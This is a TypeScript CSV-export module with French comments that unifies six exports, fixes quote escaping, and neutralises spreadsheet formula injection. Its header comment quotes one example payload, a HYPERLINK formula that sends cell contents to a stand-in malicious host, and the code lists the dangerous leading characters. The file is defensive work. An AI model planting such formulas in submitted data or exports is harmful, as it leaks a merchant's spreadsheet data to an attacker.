// exportCsv.ts — le fichier exporté, ouvert dans le tableur du commerçant.
//
// Relevé du 14 septembre. Le produit fabrique six CSV — messages, pages, QR
// codes, statistiques (quatre exports), scans d'un QR — et chacun avait sa
// propre façon d'échapper une cellule. Trois faits mesurés :
//
// 1) `app/dashboard/profile/page.tsx` échappait le guillemet en TRIPLE :
//
//        const esc = v => `"${String(v ?? "").replace(/"/g, '"\\""')}"`
//
//    Sur un titre réel — « Menu "midi" — 12,90 € » — il écrivait
//    `"Menu """midi""" — 12,90 €"`. Relu selon RFC 4180, le champ s'arrête à
//    « Menu " » et le reste de la ligne part hors colonne. Le fichier est cassé
//    à partir de la première page dont le titre contient un guillemet.
//
// 2) Le séparateur était la virgule. Excel en français attend le séparateur de
//    liste Windows, « ; » : sans ligne d'en-tête `sep=`, tout le fichier
//    atterrit dans la colonne A. C'est le tableur de l'artisan à qui ce produit
//    s'adresse.
//
// 3) Aucun des six ne protégeait la cellule. Le message d'un formulaire est
//    écrit par le PUBLIC — n'importe qui scanne le QR et tape ce qu'il veut.
//    Un message commençant par `=` est évalué comme formule à l'ouverture :
//
//        =HYPERLINK("https://exemple-malveillant.fr/?f="&A1,"Voir la réservation")
//
//    …et le commerçant voit un lien avec le contenu de sa propre feuille dedans.
//
// Un seul module, six appelants. Module PUR.

/** Le séparateur qu'attend le tableur de l'artisan français. */
export const SEPARATEUR = ";"

/** RFC 4180 : les lignes se terminent par CRLF. */
export const FIN_DE_LIGNE = "\r\n"

/** Marque d'ordre des octets — sans elle, Excel lit « Réservation » en mojibake. */
export const BOM = "﻿"

/**
 * La ligne que les tableurs lisent pour connaître le séparateur, quelle que
 * soit leur langue. Elle évite d'avoir à choisir entre un Excel français et un
 * Excel anglais : les deux la comprennent.
 */
export const ENTETE_SEPARATEUR = `sep=${SEPARATEUR}`

/** Le caractère que l'on met devant une cellule que le tableur exécuterait. */
export const PREFIXE_NEUTRE = "'"

const DEBUTS_DANGEREUX = ["=", "@", "+", "-", "\t", "\r"]

/**
 * Un nombre ou un numéro de téléphone : « +33 6 12 34 56 78 », « -12,5 ».
 * Le « + » n'est accepté qu'en tête : « +1+1 » est une addition, pas un numéro.
 */
const NOMBRE_OU_TELEPHONE = /^[+-]?[\d\s().-]*\d[\d\s().,-]*$/

/**
 * La cellule serait-elle évaluée comme une formule ?
 *
 * `=` et `@` le sont toujours. `+` et `-` ne le sont pas quand la cellule est un
 * nombre ou un numéro de téléphone : neutraliser « +33 6 12 34 56 78 » abîmerait
 * la donnée la plus utile de l'écran Messages pour rien.
 */
export function estFormuleDeTableur(valeur: unknown): boolean {
  const s = valeur == null ? "" : String(valeur)
  if (!s) return false
  const tete = s[0]
  if (!DEBUTS_DANGEREUX.includes(tete)) return false
  if ((tete === "+" || tete === "-") && NOMBRE_OU_TELEPHONE.test(s)) return false
  return true
}

/** Le texte tel qu'il sera lu par un humain, sans être exécuté par la machine. */
export function texteNeutralise(valeur: unknown): string {
  const s = valeur == null ? "" : String(valeur)
  return estFormuleDeTableur(s) ? PREFIXE_NEUTRE + s : s
}

/**
 * Une cellule complète : neutralisée, puis entre guillemets selon RFC 4180 —
 * un guillemet intérieur s'écrit DEUX fois, pas trois.
 */
export function celluleCsv(valeur: unknown): string {
  return `"${texteNeutralise(valeur).replace(/"/g, '""')}"`
}

/** Une ligne de cellules. */
export function ligneCsv(cellules: unknown[]): string {
  return (cellules ?? []).map(celluleCsv).join(SEPARATEUR)
}

/**
 * Le fichier entier, prêt à être ouvert : BOM, ligne de séparateur, en-têtes,
 * puis les lignes. Une seule fabrique pour les six exports du produit.
 */
export function construireCsv(entetes: string[], lignes: unknown[][]): string {
  const corps = [ligneCsv(entetes), ...(lignes ?? []).map(ligneCsv)]
  return BOM + ENTETE_SEPARATEUR + FIN_DE_LIGNE + corps.join(FIN_DE_LIGNE)
}

/** Le même fichier à partir d'objets — les colonnes dans l'ordre demandé. */
export function csvDepuisObjets(lignes: Record<string, unknown>[], colonnes?: string[]): string {
  const rows = lignes ?? []
  const cles = colonnes ?? (rows.length ? Object.keys(rows[0]) : [])
  if (!cles.length) return ""
  return construireCsv(cles, rows.map(r => cles.map(k => r?.[k])))
}

/** Le type MIME et l'extension, au même endroit que le reste. */
export const TYPE_CSV = "text/csv;charset=utf-8"

/**
 * Un nom de fichier daté : deux exports du même écran ne s'appellent pas
 * pareil dans le dossier Téléchargements.
 */
export function nomDeFichierCsv(base: string, date: Date = new Date()): string {
  const propre = (base || "export").toLowerCase().normalize("NFD")
    .replace(/[̀-ͯ]/g, "").replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") || "export"
  const jour = Number.isNaN(date.getTime()) ? "" : date.toISOString().slice(0, 10)
  return jour ? `${propre}-${jour}.csv` : `${propre}.csv`
}
